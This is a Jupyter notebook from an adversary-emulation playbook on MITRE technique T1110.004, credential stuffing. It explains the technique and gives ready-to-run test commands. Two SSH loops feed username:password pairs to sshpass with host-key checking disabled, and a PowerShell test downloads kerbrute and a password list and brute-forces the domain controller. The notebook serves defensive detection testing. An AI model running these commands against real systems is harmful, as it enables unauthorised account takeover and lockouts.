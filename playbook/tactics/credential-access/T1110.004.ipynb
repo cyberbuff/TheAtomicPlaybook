{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f76df569",
   "metadata": {},
   "source": "# T1110.004 - Credential Stuffing\nAdversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)"
  },
  {
   "cell_type": "markdown",
   "id": "3cc44aa2",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1e2eda54",
   "metadata": {},
   "source": "### Atomic Test #1 - SSH Credential Stuffing From Linux\nUsing username,password combination from a password dump to login over SSH.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Requires SSHPASS\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4ba5d10",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4700998d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c56a080",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a2774078",
   "metadata": {},
   "source": "### Atomic Test #2 - SSH Credential Stuffing From MacOS\nUsing username,password combination from a password dump to login over SSH.\n\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Requires SSHPASS\n\n##### Check Prereq Commands:\n```bash\nif [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5d29dcea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f8493e3d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0af4f59a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b2f11af3",
   "metadata": {},
   "source": "### Atomic Test #3 - Brute Force:Credential Stuffing using Kerbrute Tool\nWill read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in $env:temp\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\kerbrute.exe){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"$env:temp\\kerbrute.exe\"\n\n```\n##### Description: bruteforce.txt must exist in $env:temp\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\bruteforce.txt){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"$env:temp\\bruteforce.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ccfdc8e7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e01a0ae3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd $env:temp\n.\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteforce.txt      \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7e40a23",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1110.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "f535b4b8",
   "metadata": {},
   "source": "## Detection\nMonitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}